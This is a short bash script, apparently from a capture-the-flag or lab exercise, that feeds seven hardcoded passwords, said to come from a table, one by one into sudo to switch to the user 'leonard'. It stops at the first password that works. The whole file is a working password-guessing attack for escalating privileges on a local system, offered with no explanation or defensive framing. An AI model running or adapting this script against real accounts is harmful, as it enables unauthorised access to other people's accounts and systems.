#!/bin/bash
# Define passwords from the table
passwords=(
    "minecraft123"
    "ZeqlcR2!4gN"
    "QW5al7oPN2-1"
    "F147-0356agipV"
    "averylongpasswordfornohackertodiscover"
    "VSZ785-aWB15#q"
    "42W#wskb-62wA$sc"
)

# Try each password
for pwd in "${passwords[@]}"; do
    echo "Trying password: $pwd"
    if echo "$pwd" | sudo -S -u leonard -s 'id'; then
        echo "Success! Using password: $pwd"
        exit 0
    fi
done

echo "All attempts failed"
exit 1
